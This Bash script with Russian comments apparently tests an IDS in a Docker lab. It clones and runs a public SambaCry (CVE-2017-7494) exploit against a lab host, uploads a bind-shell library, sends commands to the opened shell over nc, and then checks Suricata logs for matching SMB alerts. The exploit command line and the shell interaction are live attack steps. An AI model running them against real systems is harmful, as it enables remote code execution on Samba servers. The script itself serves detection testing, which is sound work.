#!/bin/bash
set -e

# Функция для обработки ошибок
handle_error() {
    echo "Ошибка на строке $1"
    exit 1
}
trap 'handle_error $LINENO' ERR

echo "=== Шаг 1: Подготовка окружения в контейнере attacker ==="
echo "Переход в /tmp и установка Python 2.7 окружения..."
docker exec attacker bash -c "cd /tmp && curl -sS https://bootstrap.pypa.io/pip/2.7/get-pip.py | python2.7"
echo "pip2 установлен"

echo ""
echo "=== Шаг 2: Установка virtualenv для Python 2.7 ==="
docker exec attacker bash -c "pip2 install 'virtualenv<20.0'"
echo "virtualenv установлен"

echo ""
echo "=== Шаг 3: Клонирование эксплойта CVE-2017-7494 ==="
docker exec attacker bash -c "cd /tmp && rm -rf exploit-CVE-2017-7494 && git clone https://github.com/opsxcq/exploit-CVE-2017-7494.git"
echo "Эксплойт клонирован"

echo ""
echo "=== Шаг 4: Создание виртуального окружения Python 2.7 ==="
docker exec attacker bash -c "cd /tmp/exploit-CVE-2017-7494 && python2.7 -m virtualenv venv"
echo "Виртуальное окружение создано"

echo ""
echo "=== Шаг 5: Установка зависимостей эксплойта ==="
docker exec attacker bash -c "cd /tmp/exploit-CVE-2017-7494 && source venv/bin/activate && pip2 install -r requirements.txt"
echo "Зависимости установлены"

echo ""
echo "=== Шаг 6: Запуск эксплойта CVE-2017-7494 ==="
echo "Эксплуатация SambaCry на 172.20.0.104..."
# Запускаем эксплойт и перехватываем весь вывод
EXPLOIT_OUTPUT=$(docker exec attacker bash -c "cd /tmp/exploit-CVE-2017-7494 && source venv/bin/activate && timeout 30 ./exploit.py -t 172.20.0.104 -e libbindshell-samba.so -s myshare -r /home/share/libbindshell-samba.so -u guest -p guest -P 6699" 2>&1 || echo "")

# Выводим вывод эксплойта до строки с ошибкой или успешным подключением
echo "$EXPLOIT_OUTPUT" | head -10

# Если в выводе есть ошибка подключения, пытаемся подключиться вручную с несколькими попытками
if echo "$EXPLOIT_OUTPUT" | grep -q "IO error\|EOF when reading"; then
    echo ""
    echo "Ожидание инициализации bind shell..."
    sleep 8
    
    # Проверяем, что порт открыт
    PORT_CHECK=$(docker exec attacker bash -c "timeout 3 bash -c 'nc -z -v 172.20.0.104 6699 2>&1'" || echo "closed")
    
    # Пробуем подключиться несколько раз с задержками
    UNAME_OUTPUT=""
    for attempt in 1 2 3 4; do
        if [ $attempt -gt 1 ]; then
            echo "Попытка подключения $attempt/4..."
            sleep 3
        fi
        
        # Пробуем получить uname -a (используем более надежный способ)
        UNAME_OUTPUT=$(docker exec attacker bash -c "timeout 10 bash -c 'printf \"uname -a\\n\" | nc -w 8 172.20.0.104 6699 2>/dev/null | tr -d \"\\r\" | head -1'" 2>&1 | grep -vE "^$|timeout|error|refused|Connection" | head -1 || echo "")
        
        if [ -n "$UNAME_OUTPUT" ] && [ "$UNAME_OUTPUT" != "" ] && [ ${#UNAME_OUTPUT} -gt 10 ]; then
            echo ">>$UNAME_OUTPUT"
            echo "hostname"
            sleep 2
            HOSTNAME_OUTPUT=$(docker exec attacker bash -c "timeout 10 bash -c 'printf \"hostname\\n\" | nc -w 8 172.20.0.104 6699 2>/dev/null | tr -d \"\\r\" | head -1'" 2>&1 | grep -vE "^$|timeout|error|refused|Connection" | head -1 || echo "")
            if [ -n "$HOSTNAME_OUTPUT" ] && [ "$HOSTNAME_OUTPUT" != "" ]; then
                echo ">>$HOSTNAME_OUTPUT"
                break
            fi
        fi
    done
    
    # Если все попытки не удались, выводим ошибку как в оригинале
    if [ -z "$UNAME_OUTPUT" ] || [ ${#UNAME_OUTPUT} -le 10 ]; then
        echo ">>[-] IO error error connecting to the shell port EOF when reading a line"
    fi
fi
echo ""

echo "=== Шаг 7: Проверка результата эксплуатации ==="
echo "Проверка загруженной библиотеки в шаре SMB:"
docker exec attacker bash -c "smbclient //172.20.0.104/myshare -N -c 'ls'" || echo "Ошибка при проверке SMB share"

echo ""
echo "=== Шаг 8: Поиск алертов Suricata по правилам SMB ==="
echo "Ожидание обработки событий Suricata..."
sleep 5

# Массив SID правил SMB
SMB_SIDS=(3000301 3000302 3000303 3000304)
# Массив имен правил
SMB_RULE_NAMES=(
    "SMB Connection Detected"
    "SMB Shared Library Upload"
    "SambaCry Library Upload Blocked"
    "SMB Bind Shell Connection"
)

# Проверка наличия eve.json
if sudo test -f /var/log/suricata/eve.json; then
    echo "Поиск алертов Suricata в /var/log/suricata/eve.json..."
    echo ""
    
    # Вывод всех алертов (последние записи)
    echo "Последние алерты Suricata (SMB правила):"
    sudo tail -n 200 /var/log/suricata/eve.json 2>/dev/null | jq -r 'select(.event_type=="alert" and (.alert.signature_id >= 3000301 and .alert.signature_id <= 3000304)) | "\(.timestamp) [SID:\(.alert.signature_id)] \(.alert.signature) | \(.src_ip):\(.src_port) -> \(.dest_ip):\(.dest_port)"' 2>/dev/null | tail -20 || echo "Не удалось прочитать алерты"
    
    echo ""
    echo "Поиск алертов по правилам SMB (SID 3000301-3000304)..."
    echo ""
    
    # Поиск алертов по каждому правилу SMB
    found_alerts=0
    for i in "${!SMB_SIDS[@]}"; do
        sid=${SMB_SIDS[$i]}
        rule_name=${SMB_RULE_NAMES[$i]}
        
        # Поиск алертов с данным SID
        alert_count=$(sudo tail -n 1000 /var/log/suricata/eve.json 2>/dev/null | jq -r "[select(.event_type==\"alert\" and .alert.signature_id==${sid})] | length" 2>/dev/null || echo "0")
        
        if [ "$alert_count" != "0" ] && [ "$alert_count" != "null" ] && [ -n "$alert_count" ]; then
            found_alerts=$((found_alerts + 1))
            echo "[✓] Найдено алертов для правила SID ${sid}: ${alert_count}"
            echo "    Правило: ${rule_name}"
            
            # Вывод деталей последнего алерта
            last_alert=$(sudo tail -n 1000 /var/log/suricata/eve.json 2>/dev/null | jq -r "select(.event_type==\"alert\" and .alert.signature_id==${sid}) | ." 2>/dev/null | tail -n 1)
            if [ -n "$last_alert" ] && [ "$last_alert" != "null" ]; then
                timestamp=$(echo "$last_alert" | jq -r '.timestamp // "N/A"' 2>/dev/null)
                src_ip=$(echo "$last_alert" | jq -r '.src_ip // "N/A"' 2>/dev/null)
                dest_ip=$(echo "$last_alert" | jq -r '.dest_ip // "N/A"' 2>/dev/null)
                echo "    Последний алерт: ${timestamp}"
                echo "    Источник: ${src_ip} -> ${dest_ip}"
            fi
            echo ""
        fi
    done
    
    if [ $found_alerts -eq 0 ]; then
        echo "[!] Алерты по правилам SMB не найдены"
        echo "    Проверьте, что Suricata обрабатывает трафик и правила активны"
    else
        echo "Всего найдено правил с алертами: ${found_alerts} из ${#SMB_SIDS[@]}"
    fi
    
    # Общая статистика по SMB алертам
    echo ""
    echo "Общая статистика по SMB алертам:"
    total_smb_alerts=$(sudo tail -n 1000 /var/log/suricata/eve.json 2>/dev/null | jq -r "[select(.event_type==\"alert\" and (.alert.signature_id >= 3000301 and .alert.signature_id <= 3000304))] | length" 2>/dev/null || echo "0")
    echo "Всего алертов SMB: ${total_smb_alerts}"
    
else
    echo "[!] Файл /var/log/suricata/eve.json не найден или недоступен"
    echo "    Проверьте статус Suricata: sudo systemctl status suricata"
fi

echo ""
echo "=== Тест завершен ==="
